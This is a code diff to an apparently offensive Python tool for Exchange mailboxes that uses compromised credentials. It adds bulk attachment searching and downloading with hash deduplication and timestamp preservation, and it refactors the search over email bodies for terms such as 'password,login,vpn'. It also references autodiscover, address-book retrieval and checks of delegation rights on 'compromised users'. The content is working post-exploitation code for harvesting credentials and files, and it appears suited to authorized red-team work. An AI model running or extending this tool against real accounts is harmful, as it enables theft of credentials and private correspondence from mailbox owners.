@@ -2,8 +2,9 @@
 import re
 import socket
 import gc
+import hashlib
 from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
-    NoVerifyHTTPAdapter, Message, Q, FaultTolerance, DistributionList, NTLM
+    NoVerifyHTTPAdapter, Message, Q, FaultTolerance, DistributionList, NTLM, EWSTimeZone, EWSDateTime, EWSDate
 from exchangelib.errors import UnauthorizedError, CASError
 from requests.auth import HTTPBasicAuth
 import shutil
@@ -146,7 +147,8 @@ def get_search_output_from_email(email=None, folder=None, matches_output=None):
             for recipient in email.to_recipients])[:-2] if email.to_recipients else "Unknown, WTF?!?"
     sent = email.datetime_sent
     subject = email.subject
-    attach = email.has_attachments
+
+    attaches = email.attachments if email.has_attachments else None
     output = f"""
 {Fore.LIGHTCYAN_EX + '=' * 70 + Fore.LIGHTYELLOW_EX}
 Folder:      {folder}
@@ -154,7 +156,7 @@ Sender:      {sender}
 Recipients:  {recipients}
 Sent:        {sent}
 Subject:     {subject}
-Attachments: {attach}
+{Fore.LIGHTGREEN_EX + 'Attachments: ' + ', '.join([attach.name for attach in attaches]) + Fore.LIGHTYELLOW_EX if attaches else ''}
 {matches_output}
     """
 
@@ -189,18 +191,10 @@ def get_all_subfolders(folder=None):
 # Search users email for specified terms
 def search_Emails(accountObject=None, params=None):
     search_folder = params["folder"]  # default Inbox
-    terms = params["terms"]
+    termList = params["terms"] if type(params["terms"]) == list else params['terms'].split(',')
     email_count = params.get("count")
     where_to_search = params['field']
     user_folder = params['user_folder']
-
-    # if we want to dump searching results we
-    if len(terms) > 1:
-        termList = terms.split(',')
-    elif type(terms) == list:
-        termList = terms[0].split(',')
-    else:
-        termList = terms
 
     # TODO ADD len of result printing for regex
 
@@ -208,11 +202,12 @@ def search_Emails(accountObject=None, params=None):
 
     # TODO Better filtering for bad folder
     # skipping calendar and contacts because there is no email objects there
-    bad_folders = get_all_subfolders(accountObject.contacts)
-    bad_folders += get_all_subfolders(accountObject.calendar)
-    bad_folders += get_all_subfolders(accountObject.tasks)
+    if len(all_folders) > 1:
+        bad_folders = get_all_subfolders(accountObject.contacts)
+        bad_folders += get_all_subfolders(accountObject.calendar)
+        bad_folders += get_all_subfolders(accountObject.tasks)
 
-    all_folders = [folder for folder in all_folders if folder not in bad_folders]
+        all_folders = [folder for folder in all_folders if folder not in bad_folders]
 
     storage_pattern = datetime.datetime.today().strftime(
         f'Search {search_folder} ({",".join(termList)}) %Y-%m-%d %H-%M')
@@ -236,6 +231,9 @@ def search_Emails(accountObject=None, params=None):
     print(
         Fore.LIGHTCYAN_EX + f'\n[+] Searching in emails {where_to_search} for {",".join(termList)} in "{search_folder}" Folder\n')
 
+    # TODO:
+    # First get all folders emails into dict, then
+    # go throughout emails
     for folder in all_folders:
 
         found_checked_emails_IDs = []
@@ -246,42 +244,46 @@ def search_Emails(accountObject=None, params=None):
 
         """ where to search """
 
+        fields = ['text_body', 'cc_recipients', 'sender', 'to_recipients',
+                  'subject', 'datetime_sent', 'attachments', 'has_attachments']
         # just a query what will be modified later when we chose where to search (body or subject)
-        emails_for_search = folder.all().order_by('-datetime_received').values_list('id', 'changekey')
+        emails_for_search = folder.all().order_by('-datetime_received').only(*fields)
 
         """First search stage - getting search query results"""
 
         # here are first stage search results stored
-        found_emails_IDs_not_checked = list()
+        found_emails_not_checked = list()
 
-        if where_to_search == 'body':
-            for term in termList:
-                found_emails_IDs_not_checked += list(emails_for_search.filter(body__contains=term))[:email_count]
-        elif where_to_search == 'subject':
-            for term in termList:
-                found_emails_IDs_not_checked += list(emails_for_search.filter(subject__contains=term))[:email_count]
+        # TODO: think about filter from args
+        for term in termList:
+            filter_args = {f'{where_to_search}__contains': term}
+            found_emails_not_checked += list(
+                emails_for_search.filter(**filter_args))[:email_count]
 
         # converting to set for non duplicating
-        found_emails_IDs_not_checked = set(found_emails_IDs_not_checked)
+
+        found_emails_not_checked = [email for email in found_emails_not_checked if isinstance(email, Message)]
+
+        found_emails_not_checked = list(set(found_emails_not_checked))
 
         """First search stage end"""
 
-        if len(found_emails_IDs_not_checked) == 0:
+        if len(found_emails_not_checked) == 0:
             print(Fore.LIGHTRED_EX + f"[-] Nothing found in\t\"{folder.name}\"")
             continue
 
-            # just an iterator
-        found_emails_data = accountObject.fetch(found_emails_IDs_not_checked,
-                                                only_fields=['text_body', 'cc_recipients', 'sender', 'to_recipients',
-                                                             'subject', 'datetime_sent', 'has_attachments', 'author'])
+        # just an iterator
+        # found_emails_data = accountObject.fetch(found_emails_IDs_not_checked,
+        #                                         onl=['text_body', 'cc_recipients', 'sender', 'to_recipients',
+        #                                              'subject', 'datetime_sent', 'attachments', 'author'])
 
-        # Used for non repeating already found matches (for folder)
+        # Used for non repeating (printing) already found matches (part of message text) (for folder)
         already_found_substrings = []
 
-        for email in found_emails_data:
-            if not isinstance(email, Message):
-                continue
-
+        for email_index in tqdm.tqdm(range(len(found_emails_not_checked)),
+                                     desc=Fore.LIGHTYELLOW_EX + f"Searching for {','.join(termList)} in \"{folder.name}\"",
+                                     leave=False, unit="email"):
+            email = found_emails_not_checked[email_index]
             # just removes \r, replacing \n to \\n and \S+ to " " (space)
             clear_message_text_body = sanitise_message_text_body(email.text_body)
 
@@ -301,7 +303,7 @@ def search_Emails(accountObject=None, params=None):
                     regex = '((\S+)?.{0,50}(' + "|".join(termList) + ').{0,50}(\S+)?)'
 
                     # searching with ignoring case and getting a list of substrings found by regex
-                    found_substrings = re.findall(regex, clear_message_text_body, re.IGNORECASE)
+                    found_substrings = re.findall(regex, clear_message_text_body, flags=re.IGNORECASE)
 
                     # if we want to dump found emails, we don't want to miss any email because of previously found exact substring
                     if args['dump']:
@@ -313,11 +315,11 @@ def search_Emails(accountObject=None, params=None):
                     if len(found_substrings) == 0:
                         continue
                     elif not args['quite']:
-                        print('\n' + Fore.LIGHTCYAN_EX + '[+] Found something in "{}" Folder'.format(folder.name))
+                        tqdm.tqdm.write('\n' + Fore.LIGHTCYAN_EX + '[+] Found something in "{}" Folder'.format(folder.name))
 
                     # Just how found matches will be printed later
                     matches_output = "".join(
-                        [f"\nMatch {index + 1}: \t...{match}...\n".replace('\\n \\n', '\\n') for index, match in
+                        [f"\nMatch {index + 1}:   ...{match}...\n".replace('\\n \\n', '\\n') for index, match in
                          enumerate(found_substrings)])
                     # saving found matches for non repeating
                     already_found_substrings += found_substrings
@@ -336,19 +338,23 @@ def search_Emails(accountObject=None, params=None):
                 if not params['quite']:
                     result_for_printing_colored = result_for_printing
                     for term in termList:
-                        result_for_printing_colored = result_for_printing_colored.replace(term,
-                                                                                          Fore.LIGHTRED_EX + term + Fore.LIGHTYELLOW_EX)
+                        result_for_printing_colored = re.sub(term, Fore.LIGHTRED_EX + term + Fore.LIGHTYELLOW_EX,
+                                                             result_for_printing_colored, flags=re.IGNORECASE)
 
                     for index in range(len(found_substrings)):
-                        result_for_printing_colored = result_for_printing_colored.replace(f'Match {index + 1}:',
-                                                                                          Fore.LIGHTRED_EX + f'Match {index + 1}:' + Fore.LIGHTYELLOW_EX)
-                    print(result_for_printing_colored + '\n')
+                        result_for_printing_colored = re.sub(f'Match {index + 1}:',
+                                                             Fore.LIGHTRED_EX + f'Match {index + 1}:' + Fore.LIGHTYELLOW_EX,
+                                                             result_for_printing_colored, flags=re.IGNORECASE)
+
+                    tqdm.tqdm.write(result_for_printing_colored + '\n')
 
                 writer.write(result_for_printing)
-
+            except KeyboardInterrupt:
+                tqdm.tqdm.write(Fore.LIGHTRED_EX + '\n[!] Ctrl+C, exiting\n')
+                return
             except Exception as e:
-                print(Fore.LIGHTRED_EX, "[!] Exception while searching: ")
-                print(Fore.LIGHTRED_EX, e)
+                tqdm.tqdm.write(Fore.LIGHTRED_EX, "[!] Exception while searching: ")
+                tqdm.tqdm.write(Fore.LIGHTRED_EX, e)
 
         # if we are dumping more than one folder and we found something
         if params['dump'] and len(found_checked_emails_IDs) != 0:
@@ -371,9 +377,6 @@ def search_Emails(accountObject=None, params=None):
                          tqdm_desctiption=dump_tqdm_description, folder_name=folder.name)
     writer.close()
     print(Fore.LIGHTGREEN_EX + f'\n[=] Text results saved to "{search_logfile}"\n')
-    # with open('last_search.ids', 'w', encoding='utf8') as writer:
-    #     for email in found_emails_IDs_not_checked:
-    #         writer.write(str(found_emails_IDs_not_checked))
 
 
 def proxy_check(params=None):
@@ -391,45 +394,217 @@ def proxy_check(params=None):
     return result_of_check
 
 
-# Search for attachments based on search terms provided
-def searchAttachments(accountObject, params):
-    folder = params["folder"]
-    terms = params["terms"]
-    count = params["count"]
-
-    if len(terms) > 1:
-        termList = terms.split(',')
+def get_new_filename(file_name=None):
+    """
+    :param file_name: file path to check
+    :return: if file not exists, returns false, else - new filename with appendix
+    """
+    is_file_exist = isfile(file_name)
+    if not is_file_exist:
+        return file_name
     else:
-        termList = terms
+        i = 1
+        while True:
+            extension = file_name.split('.')[-1]
+            new_file_name = file_name.replace(f'.{extension}', f'_{str(i)}.{extension}')
+            check = isfile(new_file_name)
+            if not check:
+                return new_file_name
+            i += 1
 
-    if params["delegated"]:
-        searchFolder = accountObject.inbox
-    else:
-        searchFolder = accountObject.root / 'Top of Information Store' / folder
-    if params["field"] == 'body':
-        for term in termList:
-            searchResult = searchFolder.filter(body__contains=term)[:count]
-    else:
-        for term in termList:
-            searchResult = searchFolder.filter(subject__contains=term)[:count]
 
-    print('[+] Attachment List for Compromised Users with search term {} in {} Folder'.format(terms, folder) + '\n')
-    if params.get("directory"):
-        print('[+] Saving Attachments [+]')
-    for emails in searchResult:
-        for attachment in emails.attachments:
-            print('From: {} | Subject: {} | Attachment: {}'.format(
-                emails.author.email_address, emails.subject, attachment.name))
-            if params.get("directory"):
+def create_dir(path):
+    try:
+        os.mkdir(path)
+    except:
+        pass
+    return
+
+
+def write_file_from_bytes(file_path=None, file_content=None):
+    with open(file_path, 'wb') as writer:
+        writer.write(file_content)
+    del file_content
+    gc.collect()
+    return
+
+
+def convert_ewsdate(EWSTime=None):
+    date = datetime.datetime(year=EWSTime.year, month=EWSTime.month, day=EWSTime.day, hour=EWSTime.hour,
+                             minute=EWSTime.minute,
+                             second=EWSTime.second)
+    return date
+
+
+def change_file_dates(file_path=None, EWSTime=None):
+    date = convert_ewsdate(EWSTime=EWSTime)
+    modTime = time.mktime(date.timetuple())
+
+    os.utime(file_path, (modTime, modTime))
+    return
+
+
+def filter_emails_by_attachment_names(emails=[], name_terms=[]):
+    filtered_by_attach_name = []
+    for name_term in name_terms:
+        for email in emails:
+            flag = False
+            for attachment in email.attachments:
                 if isinstance(attachment, FileAttachment):
-                    local_path = os.path.join(
-                        params.get("directory"), attachment.name)
-                    with open(local_path, 'wb') as f, attachment.fp as fp:
-                        buffer = fp.read(1024)
-                        while buffer:
-                            f.write(buffer)
-                            buffer = fp.read(1024)
-    print('\n' + 'Saved attachment to', params.get("directory"))
+                    if name_term in attachment.name:
+                        filtered_by_attach_name.append(email)
+                        flag = True
+                if flag:
+                    break
+
+    filtered_by_attach_name = list(set(filtered_by_attach_name))
+
+    return filtered_by_attach_name
+
+
+# Search for attachments based on search terms provided
+def search_Attachments(accountObject=None, params=None):
+    terms = params["terms"].split(',') if params["terms"] else None
+    count = params["count"]
+    user_folder = params['user_folder']
+    name_terms = params['name'].split(',') if params['name'] else None
+    do_dump = args['dump']
+
+    folders = get_Folders(accountObject=accountObject, params=params)
+
+    # TODO think about this
+    if len(folders) > 1:
+        bad_folders = get_all_subfolders(accountObject.contacts)
+        bad_folders += get_all_subfolders(accountObject.calendar)
+        bad_folders += get_all_subfolders(accountObject.tasks)
+
+        folders = [folder for folder in folders if folder not in bad_folders]
+
+    attach_dir = f'{user_folder}/attach'
+    create_dir(attach_dir)
+
+    if do_dump:
+        print(Fore.LIGHTGREEN_EX + f'\nGREEN{Fore.RESET}\t- Successfully saved')
+        print(Fore.LIGHTYELLOW_EX + f'YELLOW{Fore.RESET}\t- Same named file, downloading with number postfix')
+        print(Fore.LIGHTCYAN_EX + f'BLUE{Fore.RESET}\t- Already downloaded\n')
+
+    gc.collect()
+
+    # TODO folder naming like mboxes
+    for folder in folders:
+        folder_name = folder.name
+        folder_path = folder.absolute.replace(accountObject.msg_folder_root.absolute + '/', '')
+
+        emails = list(folder.all().order_by('-datetime_received').only('id', 'changekey', 'attachments',
+                                                                       'datetime_received', 'sender',
+                                                                       'to_recipients').filter(has_attachments=True))
+        if len(emails) == 0:
+            continue
+
+        if name_terms:
+            emails = filter_emails_by_attachment_names(emails=emails, name_terms=name_terms)
+            if len(emails) == 0:
+                continue
+        print(
+            Fore.LIGHTCYAN_EX + f'\n\n[+]  {"Downloading" if do_dump else "Searching"} attachments for "{folder_name}" folder')
+
+        if do_dump:
+            # creating local directory for folder
+            folder_name_sanitised = sanitise_filename(folder_name)
+            folder_path = f'{attach_dir}/'
+            folder_path += f"{''.join(['[' + parent + '] ' for parent in folder.parent.absolute.replace(accountObject.msg_folder_root.absolute + '/', '').split('/')])}{folder_name_sanitised}" if folder.parent.absolute != accountObject.msg_folder_root.absolute else f"{folder_name_sanitised}"
+
+            create_dir(folder_path)
+
+            # here we are storing filename of file and it's md5 hash
+            hashes_file = f'{folder_path}/hashes.txt'
+
+            # if we are redownloading or something, file can be already there
+            if isfile(hashes_file):
+                hashes_fp = open(hashes_file, 'r+', encoding='utf8')
+                content = hashes_fp.readlines()
+                already_downloaded_file_hashes = [line.split('\t')[1][:-1] for line in content if line != '']
+                already_downloaded_files = [line.split('\t')[0] for line in content if line != '']
+
+            else:
+                hashes_fp = open(hashes_file, 'w', encoding='utf8')
+                already_downloaded_file_hashes = []
+
+        for email_index in tqdm.tqdm(range(len(emails)),
+                                     desc=Fore.LIGHTYELLOW_EX + f"{'Downloading' if do_dump else 'Searching'} attachments ({folder_name})",
+                                     leave=False, unit="email"):
+            for attachment in emails[email_index].attachments:
+                if isinstance(attachment, FileAttachment):
+                    if name_terms:
+                        check = any([term in attachment.name for term in name_terms])
+                        if not check:
+                            continue
+
+                    date = convert_ewsdate(EWSTime=attachment.last_modified_time)
+                    date = date.strftime("%d.%m.%Y  %H:%M\t")
+
+                    if not do_dump:
+                        tqdm.tqdm.write(Fore.LIGHTYELLOW_EX + date + attachment.name)
+                        continue
+
+                    extension = attachment.name.split('.')[-1]
+                    attach_file_path = f'{folder_path}/{extension}/{attachment.name}'
+                    attach_file_path_original = attach_file_path
+
+                    # if connection failed (sometimes it can happen)
+                    for i in range(5):
+                        try:
+                            with attachment.fp as fp:
+                                new_file_content = fp.read()
+                            break
+                        except KeyboardInterrupt:
+                            tqdm.tqdm.write(Fore.LIGHTRED_EX + '\n[!] Ctrl+C, exiting\n')
+                            return
+                        except Exception as e:
+                            message = Fore.LIGHTRED_EX + f"Can't download ({str(i + 1)}/5):" + f'{attachment.name}'
+                            tqdm.tqdm.write(message)
+                            tqdm.tqdm.write(e)
+
+                    new_file_hash = hashlib.md5(new_file_content).hexdigest()
+
+                    # if hash of file already in list of hashes, do not saving
+                    if new_file_hash in already_downloaded_file_hashes:
+                        message = Fore.LIGHTCYAN_EX + f'{date}\t{attachment.name}'
+                        tqdm.tqdm.write(message)
+                        del new_file_content
+                        gc.collect()
+                        continue
+                    else:  # if hash of file not in list, perform saving
+
+                        # if same named file exist, getting it name with number suffix, if not - nothing changes
+                        attach_file_path = get_new_filename(attach_file_path)
+                        new_file_name = attach_file_path.split("/")[-1]
+
+                        # adding file hash to list for filtering
+                        already_downloaded_file_hashes.append(new_file_hash)
+                        hashes_fp.write(f'{new_file_name}\t{new_file_hash}\n')
+
+                        # Saving file
+                        create_dir(f'{folder_path}/{extension}')
+                        with open(attach_file_path, 'wb') as writer:
+                            writer.write(new_file_content)
+
+                        # updating file's creation and update dates
+                        change_file_dates(file_path=attach_file_path, EWSTime=attachment.last_modified_time)
+
+                        if attach_file_path_original == attach_file_path:
+                            # if name not changed - it's okay, just new file
+                            message = Fore.LIGHTGREEN_EX + f'{date}\t{attachment.name}'
+                            tqdm.tqdm.write(message)
+                        else:
+                            # if we have same named files with different hashes
+                            message = Fore.LIGHTYELLOW_EX + f'{date}\t{attachment.name}\nSaved as \t\t\t{new_file_name}'
+                            tqdm.tqdm.write(message)
+        if do_dump:
+            hashes_fp.close()
+
+    print(Fore.LIGHTYELLOW_EX + '\n[=] Done searching\n')
+    return
 
 
 # Check where compromised user has delegation rights
@@ -574,7 +749,7 @@ def find_Folder(accountObject=None, folder_to_find=None):
 
 
 def sanitise_filename(file_path=None):
-    return re.sub(r"[^\sа-яА-ЯёЁ0-9a-zA-Z\(\)\]\[\.\-\@]+", " ", file_path)
+    return re.sub(r"[^\sа-яА-ЯёЁ0-9a-zA-Z\(\)\]\[\.\-\@_+,№]+", " ", file_path)
 
 
 def dump_to_Mbox(folder_name=None, mbox_file_path=None, mimes_list=[], tqdm_desctiption=""):
@@ -702,9 +877,13 @@ def dump_Folders(accountObject=None, params=None):
     all_folders_2_dump = get_Folders(accountObject=accountObject, params=params)
 
     # filter for useless folders
-    bad_folders = get_all_subfolders(accountObject.calendar) + get_all_subfolders(accountObject.contacts)
-    all_folders_2_dump = [folder for folder in all_folders_2_dump if
-                          folder not in bad_folders]
+    if len(all_folders_2_dump) > 1:
+        bad_folders = get_all_subfolders(accountObject.contacts)
+        bad_folders += get_all_subfolders(accountObject.calendar)
+        bad_folders += get_all_subfolders(accountObject.tasks)
+
+        all_folders_2_dump = [folder for folder in all_folders_2_dump if
+                              folder not in bad_folders]
 
     # skipping empty folders
     all_folders_2_dump = [folder for folder in all_folders_2_dump if folder.total_count != 0]
@@ -887,7 +1066,7 @@ def get_Autodiscover(params=None):
                         writer.write(response.text)
 
                     regex = '(?<=(<ewsurl>))http(s)?://([^/]+)(?=(\S+</EwsUrl>))'
-                    servers = list(set([result[2] for result in re.findall(regex, response.text, re.IGNORECASE)]))
+                    servers = list(set([result[2] for result in re.findall(regex, response.text, flags=re.IGNORECASE)]))
                     print(Fore.LIGHTCYAN_EX, '\n[!] Your servers are:')
                     for index, ews_server in enumerate(servers):
                         print(Fore.LIGHTGREEN_EX, "{:>5s}.\t{}".format(str(index), ews_server))
@@ -958,20 +1137,24 @@ def get_args():
                                   help='Folder to search through', default='Inbox')
     search_subparser.add_argument('-t', '--terms', action="store",
                                   dest="terms", metavar=' ',
-                                  help='String to Search (Comma separated for multiple terms)',
-                                  nargs='+', type=str, default='password,login,vpn')
+                                  help='Terms to search in email text body (Comma separated)',
+                                  type=str, default='password,login,vpn')
     search_subparser.add_argument('-c', '--count', action="store",
                                   dest="count", metavar=' ', help='Search up to N emails for term', type=int)
     search_subparser.add_argument('--field', action="store", default='body',
                                   dest="field", help='Email field to search. Default is subject',
                                   choices=['subject', 'body'])
-    search_subparser.add_argument('object', choices=['folders', 'emails'], type=str)
+    search_subparser.add_argument('object', choices=['folders', 'emails', 'attach'], type=str)
     search_subparser.add_argument('--dump', action='store_true', default=False,
                                   help='Dump found to mbox file')
     search_subparser.add_argument('-r', '--recurse', action='store_true', default=False,
                                   help='Do recurse search if custom folder (-f) specified')
     search_subparser.add_argument('-q', '--quite', action='store_true', default=False,
                                   help='Do not print search results on the screen')
+    search_subparser.add_argument('-n', '--name', action="store",
+                                  dest="name", metavar=' ',
+                                  help='Search this terms in attachment names (Comma separated)\nExample - docx,config,report',
+                                  type=str)
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -1007,7 +1190,7 @@ def get_lzx_file(params=None):
         del auths['Basic']
 
     regex = r'<OABUrl>(http.*)</OABUrl>'
-    oab_urls = re.findall(regex, autodiscover, re.IGNORECASE)
+    oab_urls = re.findall(regex, autodiscover, flags=re.IGNORECASE)
 
     oab_urls = list(set(oab_urls))
     print()
@@ -1249,9 +1432,11 @@ if __name__ == "__main__":
     elif action == 'search':
         if action_object == 'emails':
             search_Emails(accountObj, args)
-        if action_object == 'contacts':
+        elif action_object == 'attach':
+            search_Attachments(accountObject=accountObj, params=args)
+        elif action_object == 'contacts':
             print('NOT IMPLEMENTED YET!')
-        if action_object == 'folders':
+        elif action_object == 'folders':
             print('NOT IMPLEMENTED YET!')
 
     # TODO: Разобраться с этим
